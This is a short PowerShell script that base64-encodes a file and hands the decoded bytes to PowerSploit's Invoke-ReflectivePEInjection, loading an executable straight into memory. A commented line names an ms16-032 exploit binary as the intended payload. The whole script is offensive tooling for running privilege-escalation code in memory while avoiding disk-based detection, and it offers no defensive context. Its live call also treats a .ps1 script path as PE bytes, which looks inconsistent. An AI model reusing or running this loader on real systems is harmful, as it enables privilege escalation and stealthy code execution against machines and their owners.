Function Convert-BinaryToString {
   [CmdletBinding()] param([string] $FilePath)
   try {
      $ByteArray = [System.IO.File]::ReadAllBytes($FilePath);
   }catch {
      throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct.";
   }
   if ($ByteArray) {
      $Base64String = [System.Convert]::ToBase64String($ByteArray);
   }else{
      throw '$ByteArray is $null.';
   }
   $Base64String
}

# . .\Convert-BinaryToString.ps1
# $InputString = Convert-BinaryToString -FilePath .\ms16-032_x64.exe
$InputString = Convert-BinaryToString -FilePath 'C:\WINDOWS\system32\PowerSploit\CodeExecution\Test.ps1'
$PEBytes = [System.Convert]::FromBase64String($InputString)
Invoke-ReflectivePEInjection -PEBytes $PEBytes
 
 #https://github.com/clymb3r/PowerShell
 #https://github.com/PowerShellMafia